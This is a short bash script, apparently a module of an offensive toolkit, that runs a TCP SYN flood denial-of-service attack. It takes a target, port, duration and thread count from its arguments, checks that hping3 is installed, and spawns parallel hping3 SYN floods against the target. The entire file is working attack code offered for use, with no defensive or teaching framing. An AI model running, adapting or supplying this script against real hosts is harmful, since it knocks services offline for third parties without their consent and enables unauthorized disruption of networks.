#!/bin/bash

# TCP Flood Attack Module
source core/banner.sh

tcp_flood() {
    local target=$1
    local port=$2
    local duration=$3
    local threads=$4
    
    echo -e "${CYAN}[TCP FLOOD]${NC} Starting TCP flood attack..."
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Threads: $threads${NC}"
    
    # Check if hping3 is available
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}Error: hping3 not found. Please install hping3.${NC}"
        exit 1
    fi
    
    # Launch TCP flood using hping3
    echo -e "${GREEN}Launching TCP flood...${NC}"
    
    for ((i=1; i<=threads; i++)); do
        {
            timeout $duration hping3 -S -p $port -i u1000 $target > /dev/null 2>&1
        } &
    done
    
    # Wait for all background processes
    wait
    
    echo -e "${GREEN}TCP flood attack completed.${NC}"
}

# If script is called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    tcp_flood "$1" "$2" "$3" "$4"
fi

